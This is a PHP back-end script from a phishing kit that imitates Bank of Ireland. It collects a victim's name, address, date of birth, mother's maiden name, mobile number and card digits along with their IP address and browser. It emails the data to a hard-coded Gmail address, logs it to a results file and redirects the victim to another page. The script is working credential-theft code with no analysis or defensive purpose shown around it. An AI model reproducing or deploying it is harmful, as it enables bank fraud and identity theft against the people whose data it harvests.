<?
$ip = getenv("REMOTE_ADDR");
$browser = $_SERVER['HTTP_USER_AGENT'];
$message .= "-----------------2 PERSONALDetails----------------\n";
$message .= "NAME		: ".$_POST['FN']."\n";
$message .= "ADDRESS	: ".$_POST['AD']."\n";
$message .= "CITY		: ".$_POST['CI']."\n";
$message .= "COUNTY		: ".$_POST['ST']."\n";
$message .= "DOB		: ".$_POST['DB']."\n";
$message .= "MMN		: ".$_POST['MN']."\n";
$message .= "MOBILE		: ".$_POST['MO']."\n";
$message .= "8 digit card number		: ".$_POST['8card']."\n";
$message .= "--------created by medpage[679849675]-------------\n";
$message .= "IP          : ".$ip."\n";$IP=$_POST['IP'];
$message .= "BROWSER     : ".$browser."\n";$browser=$_POST['browser'];
$message .= "-----------------boiRESULTS-----------------------\n";
$send = "ladybee9020@gmail.com";
$subject = "bankofirelandRESULTS 2 ".$_POST['results'];
$arr=array($send, $IP);
foreach ($arr as $send)
{
mail($send,$subject,$message);
}
$fp = fopen('results.txt', 'a');
fwrite($fp, $message);
fclose($fp);
?>
<script>

    window.top.location.href = "indexxxxx.html";

</script>